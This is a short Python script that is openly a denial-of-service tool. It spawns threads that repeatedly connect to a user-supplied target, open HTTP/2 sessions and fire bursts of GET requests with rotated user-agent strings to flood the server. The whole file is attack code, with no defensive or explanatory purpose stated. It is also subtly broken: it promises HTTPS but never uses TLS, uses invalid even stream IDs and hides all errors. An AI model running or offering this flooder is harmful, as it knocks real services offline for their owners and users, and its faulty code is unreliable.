#!/usr/bin/env python3
import sys, time, threading, ssl, socket, random
try:
    import h2.connection
    import h2.config
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_H2:
    print("HTTP/2 requires h2 library: pip install h2")
    sys.exit(1)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
]

def http2_flood():
    while running:
        try:
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            
            for stream_id in range(1, 100):
                headers = [
                    (':method', 'GET'),
                    (':path', '/'),
                    (':scheme', 'https'),
                    (':authority', target),
                    ('user-agent', random.choice(USER_AGENTS)),
                ]
                conn.send_headers(stream_id, headers, end_stream=True)
                sock.send(conn.data_to_send())
            sock.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=http2_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
